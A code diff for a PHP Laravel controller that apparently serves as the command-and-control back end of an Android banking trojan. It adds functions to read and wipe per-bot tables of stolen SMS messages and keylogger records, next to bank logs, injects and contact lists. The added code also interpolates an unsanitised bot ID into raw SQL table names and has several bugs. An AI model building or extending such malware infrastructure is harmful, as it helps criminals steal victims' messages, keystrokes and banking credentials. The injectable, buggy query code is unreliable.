@@ -10,6 +10,7 @@ use App\Models\GlobalSetting;
 use App\Models\Inject;
 use App\Models\SmsLog;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Schema;
 
 use DB;
 
@@ -271,11 +272,25 @@ class BotController extends Controller
 
         switch ($logType) {
             case 'sms':
-                return SmsLog::wherebotId($botId)->get();
+                $table = 'sms_logs_' . $botId;
+
+                if (Schema::hasTable($table)) {
+                    $rows = DB::SELECT("SELECT * FROM $table");
+                    return $rows;
+                }
+
+                return $rows;
             case 'bankLogs':
                 return BankLog::wherebotId($botId)->get();
             case 'keyLogger':
+                $table = 'key_logs_' . $botId;
 
+                if (Schema::hasTable($table)) {
+                    $rows = DB::SELECT("SELECT * FROM $table");
+                    return $rows;
+                }
+
+                return $rows;
             case 'savedSms':
             case 'installedApp':
             case 'contactList':
@@ -283,5 +298,42 @@ class BotController extends Controller
         }
 
         return [];
+    }
+
+    public function deleteBotLog($params) {
+        $botId = $params->botId;
+        $logType = $params->logType;
+
+        switch ($logType) {
+            case 'sms':
+                $table = 'sms_logs_' . $botId;
+                if (Schema::hasTable($table)) {
+                    if (DB::DELETE("DELETE FROM $table")) {
+                        return ['type' => 'success', 'message' => 'The logs are deleted successfully.'];
+                    }
+
+                    return ['type' => 'error', 'message' => 'The database error'];
+                }
+                return ['type' => 'error', 'messag' => 'No data'];
+            case 'bankLogs':
+                return BankLog::wherebotId($botId)->get();
+            case 'keyLogger':
+                $table = 'key_logs_' . $botId;
+                if (Schema::hasTable($table)) {
+                    if (DB::DELETE("DELETE FROM $table")) {
+                        return ['type' => 'success', 'message' => 'The logs are deleted successfully.'];
+                    }
+
+                    return ['type' => 'error', 'message' => 'The database error'];
+                }
+                return ['type' => 'error', 'messag' => 'No data'];
+            case 'savedSms':
+            case 'installedApp':
+            case 'contactList':
+                break;
+        }
+
+        return ['type' => 'success', 'message' => 'The logs are deleted successfully.'];
+
     }
 }
